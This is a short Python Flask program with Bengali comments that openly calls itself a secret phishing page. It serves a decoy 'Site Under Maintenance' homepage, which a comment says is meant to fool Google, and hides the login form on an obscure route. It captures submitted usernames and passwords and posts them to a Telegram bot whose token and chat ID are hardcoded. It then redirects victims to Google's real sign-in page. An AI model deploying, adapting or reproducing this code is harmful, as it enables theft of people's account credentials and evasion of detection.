import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

BOT_TOKEN = "8307189262:AAF-D6rvhKzuzFo3vCJam4R_hKgNvOCv6uI"
CHAT_ID = "8307189262"

# ১. সাধারণ হোমপেজ (গুগলকে ফাঁকি দিতে)
@app.route('/')
def home():
    # এখানে একটি সাধারণ টেক্সট থাকবে যা দেখে গুগল ভাববে সাইটটি নষ্ট বা খালি
    return "<h1>Site Under Maintenance</h1><p>Please check back later.</p>", 200

# ২. আপনার গোপন ফিশিং পেজ
@app.route('/login-auth-verify-security') 
def login_page():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def handle_data():
    u_ref = request.form.get('username')
    p_key = request.form.get('password')

    msg = f"🚨 **New Data** 🚨\n\n👤 User: `{u_ref}`\n🔑 Pass: `{p_key}`"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

    return redirect("https://accounts.google.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
